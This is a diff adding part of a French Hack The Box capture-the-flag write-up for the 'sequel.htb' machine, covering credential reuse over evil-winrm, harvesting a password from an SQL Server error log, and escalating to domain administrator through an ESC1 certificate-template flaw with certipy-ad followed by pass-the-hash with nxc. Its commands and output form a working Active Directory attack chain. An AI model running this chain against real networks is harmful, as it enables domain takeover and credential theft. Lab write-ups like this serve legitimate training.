@@ -379,3 +379,317 @@ Hardware.Mon.#1..: Temp: 43c Util: 68%
 Started: Wed Feb 28 20:58:24 2024
 Stopped: Wed Feb 28 20:58:47 2024
 ```
+
+Ok Maintenant que j'ai un autre mot de passe alors quoi faire?
+
+- D'abord je vais essayer de me connecter sur `winrm` avec cet utilisateur
+
+```terminal
+└─# evil-winrm -i $ip -u sql_svc -p REGGIE1234ronnie
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\sql_svc\Documents> 
+```
+
+D'ici je vais aller dans la directory des Users
+
+```terminal
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         2/7/2023   8:58 AM                Administrator
+d-r---        7/20/2021  12:23 PM                Public
+d-----         2/1/2023   6:37 PM                Ryan.Cooper
+d-----         2/7/2023   8:10 AM                sql_svc
+```
+
+Je vois trois utilisateurs, dont l'admin, Ryan.Cooper et le sql_svc que j'ai deja eu acces. alors je crois que je dois chercher des infos pour avoir acces a l'utilisateur `Ryan.Cooper`.
+
+Pour cela je vais checker et voir s'il ya d'interessante fichier, je me rend dans le ``C:\``
+```terminal
+*Evil-WinRM* PS C:\> dir
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         2/1/2023   8:15 PM                PerfLogs
+d-r---         2/6/2023  12:08 PM                Program Files
+d-----       11/19/2022   3:51 AM                Program Files (x86)
+d-----       11/19/2022   3:51 AM                Public
+d-----         2/1/2023   1:02 PM                SQLServer
+d-r---         2/1/2023   1:55 PM                Users
+d-----         2/6/2023   7:21 AM                Windows
+
+
+*Evil-WinRM* PS C:\> 
+```
+
+D'ici je vais verifier le `SQLServer`
+
+```terminal
+*Evil-WinRM* PS C:\SQLServer> dir
+
+
+    Directory: C:\SQLServer
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         2/7/2023   8:06 AM                Logs
+d-----       11/18/2022   1:37 PM                SQLEXPR_2019
+-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
+-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe
+
+
+*Evil-WinRM* PS C:\SQLServer> cd Logs
+*Evil-WinRM* PS C:\SQLServer\Logs> dir
+
+
+    Directory: C:\SQLServer\Logs
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
+```
+
+Dans cet SQLServer je trouve un Directory `Logs` et a l'interieur j'ai un fichier backup des erreurs en `.bak`
+Donc je vais le download sur ma machine et l'analyser
+
+```terminal
+Evil-WinRM* PS C:\SQLServer\Logs> download ERRORLOG.BAK /home/blo/CTFs/Boot2root/HTB/ERRORLOG.BAK
+                                        
+Info: Downloading C:\SQLServer\Logs\ERRORLOG.BAK to /home/blo/CTFs/Boot2root/HTB/ERRORLOG.BAK
+                                        
+Info: Download successful!
+```
+
+Pour l'analyse je cherche tout les strings commenecant par `user`, `password` Dans mon sublime Text et je trouve :
+
+```terminal
+2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
+2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
+
+```
+
+Ici l'utilisateur `Ryan.Cooper` a essaye de se logger avec un mot de passe invalide et en bas je vois un utilisateur qui ressemble bien a un password, donc je vais combiner les deux et voir
+
+```terminal
+└─# evil-winrm -i $ip -u ryan.cooper -p NuclearMosquito3
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> type user.txt
+3b2c99e40f1df5c2a4dc9b5f2bc6b6a5
+
+```
+
+Ouais ca a bien marcher et j'ai pu avoir le flag user
+
+## Privilege Escalation
+Dans la description on me dit que Une énumération plus poussée de la machine révèle qu'une autorité de certification est présente et qu'un modèle de certificat est vulnérable à l'attaque `ESC1`, ce qui signifie que les utilisateurs qui peuvent utiliser ce modèle peuvent demander des certificats pour n'importe quel autre utilisateur du domaine, y compris les administrateurs de domaine. Ainsi, en exploitant la vulnérabilité `ESC1`, un attaquant est en mesure d'obtenir un certificat valide pour le compte Administrateur et de l'utiliser pour obtenir le hash de l'utilisateur Administrateur.< 
+
+Je crois que la je dois enumerer les certificates et les compromettre pour etre Domain Admins
+```terminal
+└─# nxc ldap sequel.htb -u ryan.cooper -p NuclearMosquito3
+SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
+LDAPS       10.129.228.253  636    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 
+
+
+└─# nxc ldap sequel.htb -u ryan.cooper -p NuclearMosquito3 -M adcs
+SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
+LDAPS       10.129.228.253  636    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 
+ADCS        10.129.228.253  389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
+ADCS                                                Found PKI Enrollment Server: dc.sequel.htb
+ADCS                                                Found CN: sequel-DC-CA
+
+```
+
+Pour enumerer des certif j'ajoute le `-M adcs` et bien je trouve un PKI et un CN. Donc maintenant je vais utiliser `certipy-ad` pour trouver des templates vulnerables
+
+```terminal
+─# certipy-ad find -u ryan.cooper -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -vulnerable -stdout
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'sequel-DC-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'sequel-DC-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : sequel-DC-CA
+    DNS Name                            : dc.sequel.htb
+    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
+    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
+    Certificate Validity End            : 2121-11-18 21:08:46+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : SEQUEL.HTB\Administrators
+      Access Rights
+        ManageCa                        : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        ManageCertificates              : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Enroll                          : SEQUEL.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : UserAuthentication
+    Display Name                        : UserAuthentication
+    Certificate Authorities             : sequel-DC-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Client Authentication
+                                          Secure Email
+                                          Encrypting File System
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 10 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Domain Users
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Administrator
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+        Write Property Principals       : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+    [!] Vulnerabilities
+      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
+
+```
+
+- [Exploit AD Cs](https://redfoxsec.com/blog/exploiting-active-directory-certificate-services-ad-cs/)
+- [Exploit AD Cs](https://redfoxsec.com/blog/exploiting-misconfigured-active-directory-certificate-template-esc1/)
+
+Certipy-ad trouve que les certificats sont vulnerable aux `ESC1`. car l'utilisateur `can enroll, enrollee supplies subject and template allows client authentication`
+- Pour exploiter l'`ESC1`, le template doit répondre à certains critères. Le modèle doit avoir :
+
+  - Les droits d'inscription sont définis pour le groupe auquel appartient notre utilisateur afin que nous puissions demander un nouveau certificat à l'autorité de certification (CA).
+  - Utilisation étendue de la clé : Authentification du client signifie que le certificat généré sur la base de ce modèle peut authentifier les ordinateurs du domaine.
+  - Enrollee Supplies Subject est défini sur True, ce qui signifie que nous pouvons fournir un SAN (Subject Alternate Name).
+  - Aucune approbation du gestionnaire n'est requise, ce qui signifie que la demande est approuvée automatiquement.
+
+
+Alors je vais essayer de l'exploiter avec le meme outil
+
+```terminal
+└─# certipy-ad req  -u ryan.cooper -p 'NuclearMosquito3' -ca sequel-DC-CA -target sequel.htb -template UserAuthentication -upn Administrator@sequel.htb
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 17
+[*] Got certificate with UPN 'Administrator@sequel.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+maintenant que j'ai le `administrator.pfx` alors je vais utiliser le meme outil avec l'option `auth` qui me donnera le hash de l'utilisateur
+
+```terminal
+└─# certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@sequel.htb
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+```
+quelque erreurs avec les heures de la box distant et de ma machine avec ces commandes je fixe
+
+- `sudo timedatectl set-ntp off`
+- `rdate $ip`
+
+```terminal
+└─# certipy-ad auth -pfx administrator.pfx
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@sequel.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
+```
+
+Et voila j'ai bien le hash de l'admin alors Pass-the-hash
+
+
+```terminal
+┌──(root㉿xXxX)-[/home/…/CTFs/Boot2root/HTB/CertifAD]
+└─# nxc smb $ip -u 'Administrator' -H aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
+SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
+SMB         10.129.228.253  445    DC               [+] sequel.htb\Administrator:a52f78e4c751e5f5e17e1e9f3e58f4ee (Pwn3d!)
+└─# nxc smb $ip -u 'Administrator' -H aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee -x whoami
+SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
+SMB         10.129.228.253  445    DC               [+] sequel.htb\Administrator:a52f78e4c751e5f5e17e1e9f3e58f4ee (Pwn3d!)
+SMB         10.129.228.253  445    DC               [+] Executed command via wmiexec
+SMB         10.129.228.253  445    DC               sequel\administrator
+
+└─# nxc smb $ip -u 'Administrator' -H aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee -x 'type C:\Users\Administrator\Desktop\root.txt'
+SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
+SMB         10.129.228.253  445    DC               [+] sequel.htb\Administrator:a52f78e4c751e5f5e17e1e9f3e58f4ee (Pwn3d!)
+SMB         10.129.228.253  445    DC               [+] Executed command via wmiexec
+SMB         10.129.228.253  445    DC               2981482e4681ca3eedbe3ff90180540b
+
+
+```
+
+
+
+
+
+
+
+
+
+
+
+
